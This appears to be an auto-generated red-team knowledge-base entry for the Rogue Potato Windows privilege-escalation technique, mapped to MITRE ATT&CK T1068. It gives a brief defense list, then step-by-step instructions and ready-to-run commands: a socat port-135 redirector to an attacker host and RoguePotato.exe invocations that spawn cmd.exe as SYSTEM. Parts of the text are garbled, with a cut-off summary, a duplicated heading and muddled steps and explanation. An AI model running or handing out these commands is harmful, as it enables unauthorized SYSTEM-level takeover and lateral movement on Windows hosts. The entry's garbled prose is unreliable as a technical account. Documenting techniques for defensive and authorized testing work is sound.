---
id: 4fdf3a46-deda-4f22-beb6-db24019a5466
name: Rogue Potato Impersonation Privileges
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:30.209726+00:00'
updated_at: '2023-04-10T20:37:35.133154+00:00'
tactics:
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
tags:
- '[[EoP - Impersonation Privileges]]'
- '[[Rogue Potato (Fake OXID Resolver)]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Network redirector / port forwarder]]'
- '[[RoguePotato all in one with RogueOxidResolver running locally on port 9999]]'
- '[[RoguePotato all in one with RogueOxidResolver running locally on port 9999 and
  specific clsid and custom pipename]]'
- '[[RoguePotato without running RogueOxidResolver locally]]'
---

# Rogue Potato Impersonation Privileges

## Summary

Rogue Potato is a technique used for privilege escalation that exploits the DCOM protocol to impersonate privileges. This technique is used to gain SYSTEM-level privileges by impersonating the OXID resolver, which is responsible for mapping Object Export Interfaces to Object Export Endpoints. This 

## Description

# Description

Rogue Potato is a technique used for privilege escalation that exploits the DCOM protocol to impersonate privileges. This technique is used to gain SYSTEM-level privileges by impersonating the OXID resolver, which is responsible for mapping Object Export Interfaces to Object Export Endpoints. This technique is used to bypass security measures and gain access to sensitive data. The attacker can use this technique to move laterally within the network and gain access to other systems. The technique is effective against Windows 10 and Windows Server 2019.

 

## Requirements

1. Authenticated access to the target system

1. DCOM is enabled on the target system

1. The attacker has the ability to execute code on the target system

 

## Defense

1. Disable DCOM if it is not required for business operations

1. Monitor for rogue OXID resolvers and investigate any suspicious activity

1. Implement network segmentation to limit lateral movement

 

## Objectives

1. Gain SYSTEM-level privileges

1. Move laterally within the network

1. Gain access to sensitive data

 

# Instructions

1. To execute commands on a remote machine, follow these steps:
1. Run the network redirector/port forwarder on the remote machine using the following command:
   socat tcp-listen:135,reuseaddr,fork tcp:<remote_machine_ip>:9999
2. On your local machine, run the RoguePotato.exe file using the appropriate arguments:
   a. To execute commands on the remote machine without running RogueOxidResolver locally, use the following command:
      RoguePotato.exe -r <remote_machine_ip> -e "C:\windows\system32\cmd.exe"
   b. To execute commands on the remote machine with RogueOxidResolver running locally on port 9999, use the following command:
      RoguePotato.exe -r <remote_machine_ip> -e "C:\windows\system32\cmd.exe" -l 9999
   c. To execute commands on the remote machine with RogueOxidResolver running locally on port 9999 and a specific clsid and custom pipename, use the following command:
      RoguePotato.exe -r <remote_machine_ip> -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p <custom_pipename>

 



**Code**: [[# Network redirector / port forwarder to run on yo]]



> This command allows you to execute commands on a remote machine using RoguePotato. RoguePotato is a tool that exploits a vulnerability in Windows COM and DCOM to execute arbitrary code on a remote system. To use this command, you need to have RoguePotato.exe and socat installed on your local machine. The command involves setting up a network redirector/port forwarder on the remote machine using socat and then running RoguePotato.exe on your local machine with appropriate arguments to execute commands on the remote machine. The instruction field provides a step-by-step guide on how to use this command, and the explain field provides an overview of what this command does.



**Command** ([[Network redirector / port forwarder]]):

```bash
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
```





**Command** ([[RoguePotato without running RogueOxidResolver locally]]):

```bash
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
```





**Command** ([[RoguePotato all in one with RogueOxidResolver running locally on port 9999]]):

```bash
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
```





**Command** ([[RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename]]):

```bash
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
```



## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]

## Commands Used

- [[Network redirector / port forwarder]]
- [[RoguePotato all in one with RogueOxidResolver running locally on port 9999]]
- [[RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename]]
- [[RoguePotato without running RogueOxidResolver locally]]

## Tags

- [[EoP - Impersonation Privileges]]
- [[Rogue Potato (Fake OXID Resolver)]]
- [[Windows - Privilege Escalation]]


